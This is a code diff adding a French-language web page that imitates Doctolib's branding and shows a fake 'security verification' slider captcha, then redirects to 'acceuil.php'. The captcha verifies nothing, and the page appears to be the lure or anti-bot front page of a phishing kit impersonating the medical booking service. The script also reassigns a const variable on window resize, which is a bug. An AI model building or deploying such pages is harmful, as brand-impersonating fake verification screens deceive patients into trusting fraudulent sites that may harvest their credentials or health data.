@@ -1,0 +1,280 @@
+<!DOCTYPE html><html lang="fr"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification de sécurité - Doctolib</title>
+    <link rel="stylesheet" href="css/main.css">
+    <style>
+        /* Container spécifique au captcha */
+        .container {
+            max-width: 500px;
+            width: 90%;
+            margin: 60px auto;
+            background-color: #fff;
+            padding: 35px;
+            border-radius: 8px;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.08);
+            transition: transform 0.2s ease;
+            border: 1px solid #f3f3f3;
+        }
+        
+        /* Slider container */
+        .slider-container {
+            position: relative;
+            width: 100%;
+            height: 36px;
+            background-color: #f3f7fa;
+            border-radius: 18px;
+            margin-bottom: 20px;
+            overflow: hidden;
+            box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);
+            transition: all 0.3s ease;
+            border: 1px solid #e9eff5;
+        }
+        
+        .slider-container:hover {
+            background-color: #f5f8fc;
+        }
+        
+        /* Slider track */
+        .slider-track {
+            position: absolute;
+            height: 100%;
+            width: 0;
+            background: #0596DE;
+            border-radius: 18px;
+            transition: width 0.2s ease-out;
+            left: 0;
+        }
+        
+        /* Slider handle */
+        .slider-handle {
+            position: absolute;
+            width: 44px;
+            height: 36px;
+            background-color: white;
+            border-radius: 18px;
+            cursor: pointer;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            left: 0;
+            color: #0596DE;
+        }
+        
+        .slider-handle:hover {
+            background-color: #f8f8f8;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+        }
+        
+        .slider-handle:active {
+            background-color: #f0f0f0;
+            transform: scale(0.98);
+        }
+        
+        /* Slider text */
+        .slider-text {
+            position: absolute;
+            width: 100%;
+            text-align: center;
+            line-height: 36px;
+            color: #666;
+            z-index: 1;
+            font-size: 15px;
+            transition: opacity 0.3s ease;
+        }
+        
+        /* Success message */
+        .success-message {
+            color: #3dc18d;
+            text-align: center;
+            display: none;
+            margin-top: 20px;
+            font-weight: 500;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* Pulse animation for the handle */
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(5, 150, 222, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(5, 150, 222, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(5, 150, 222, 0); }
+        }
+        
+        .pulse {
+            animation: pulse 1.5s infinite;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo"><img src="images/f35a8b925b7443e209a9.svg" alt="Doctolib"></div>
+    </header>
+    
+    <div class="container">
+        <h1>Vérification de sécurité</h1>
+        <p>Pour vérifier que vous n'êtes pas un robot, veuillez faire glisser le curseur jusqu'à la fin de la barre.</p>
+        
+        <div class="slider-container">
+            <div class="slider-text">Faites glisser pour vérifier →</div>
+            <div class="slider-track"></div>
+            <div class="slider-handle pulse">→</div>
+        </div>
+        
+        <div class="success-message">Vérification réussie ! Redirection en cours...</div>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const sliderHandle = document.querySelector('.slider-handle');
+            const sliderTrack = document.querySelector('.slider-track');
+            const sliderContainer = document.querySelector('.slider-container');
+            const sliderText = document.querySelector('.slider-text');
+            const successMessage = document.querySelector('.success-message');
+            
+            let isDragging = false;
+            let startX = 0;
+            let startLeft = 0;
+            
+            const maxLeft = sliderContainer.clientWidth - sliderHandle.clientWidth;
+            
+            // Remove pulse animation when user interacts with the slider
+            sliderHandle.addEventListener('mousedown', function() {
+                sliderHandle.classList.remove('pulse');
+            });
+            
+            // Touch and mouse event listeners
+            sliderHandle.addEventListener('mousedown', onDragStart);
+            sliderHandle.addEventListener('touchstart', onDragStart);
+            
+            document.addEventListener('mousemove', onDragging);
+            document.addEventListener('touchmove', onDragging, { passive: false });
+            
+            document.addEventListener('mouseup', onDragEnd);
+            document.addEventListener('touchend', onDragEnd);
+            
+            // Recalculate maxLeft on window resize
+            window.addEventListener('resize', function() {
+                maxLeft = sliderContainer.clientWidth - sliderHandle.clientWidth;
+                
+                // If not completed yet, reset the slider
+                const percentage = (parseInt(window.getComputedStyle(sliderHandle).left || 0) / maxLeft) * 100;
+                if (percentage < 98) {
+                    sliderHandle.style.left = '0';
+                    sliderTrack.style.width = '0';
+                    sliderText.style.opacity = 1;
+                }
+            });
+            
+            function onDragStart(e) {
+                isDragging = true;
+                
+                if (e.type === 'mousedown') {
+                    startX = e.clientX;
+                } else if (e.type === 'touchstart') {
+                    startX = e.touches[0].clientX;
+                }
+                
+                // Get the current left position
+                startLeft = parseInt(window.getComputedStyle(sliderHandle).left) || 0;
+                
+                // Prevent default to avoid text selection during drag
+                e.preventDefault();
+            }
+            
+            function onDragging(e) {
+                if (!isDragging) return;
+                
+                // Prevent scrolling on mobile when dragging
+                if (e.type === 'touchmove') {
+                    e.preventDefault();
+                }
+                
+                let currentX;
+                if (e.type === 'mousemove') {
+                    currentX = e.clientX;
+                } else if (e.type === 'touchmove') {
+                    currentX = e.touches[0].clientX;
+                }
+                
+                const diff = currentX - startX;
+                let newLeft = startLeft + diff;
+                
+                // Constrain within bounds
+                newLeft = Math.max(0, Math.min(newLeft, maxLeft));
+                
+                // Update handle position with proper calculation
+                sliderHandle.style.left = newLeft + 'px';
+                
+                // Update track width to exactly match the handle position
+                sliderTrack.style.width = newLeft + (sliderHandle.clientWidth / 2) + 'px';
+                
+                // Gradually hide text
+                sliderText.style.opacity = 1 - (newLeft / maxLeft);
+                
+                // Check if slider is complete
+                if (newLeft >= maxLeft * 0.95) {
+                    onSlideComplete();
+                }
+            }
+            
+            function onDragEnd() {
+                if (!isDragging) return;
+                isDragging = false;
+                
+                // Calculate current percentage
+                const currentLeft = parseInt(window.getComputedStyle(sliderHandle).left) || 0;
+                const percentage = (currentLeft / maxLeft) * 100;
+                
+                if (percentage < 95) {
+                    // Reset slider with smooth animation
+                    sliderHandle.style.transition = 'left 0.3s ease';
+                    sliderTrack.style.transition = 'width 0.3s ease';
+                    
+                    sliderHandle.style.left = '0';
+                    sliderTrack.style.width = '0';
+                    sliderText.style.opacity = 1;
+                    
+                    // Remove transition after animation completes
+                    setTimeout(function() {
+                        sliderHandle.style.transition = '';
+                        sliderTrack.style.transition = '';
+                        sliderHandle.classList.add('pulse'); // Add pulse animation back
+                    }, 300);
+                }
+            }
+            
+            function onSlideComplete() {
+                isDragging = false;
+                
+                // Ensure slider is exactly at the end
+                sliderHandle.style.left = maxLeft + 'px';
+                sliderTrack.style.width = '100%';
+                sliderText.style.opacity = 0;
+                
+                // Show success message
+                successMessage.style.display = 'block';
+                
+                // Change colors to success
+                sliderTrack.style.background = 'linear-gradient(90deg, #0abb87, #0de8a8)';
+                
+                // Remove any pulse animation
+                sliderHandle.classList.remove('pulse');
+                
+                // Redirect to acceuil.php after a short delay
+                setTimeout(function() {
+                    window.location.href = 'acceuil.php';
+                }, 1500);
+            }
+        });
+    </script>
+
+
+</body></html>
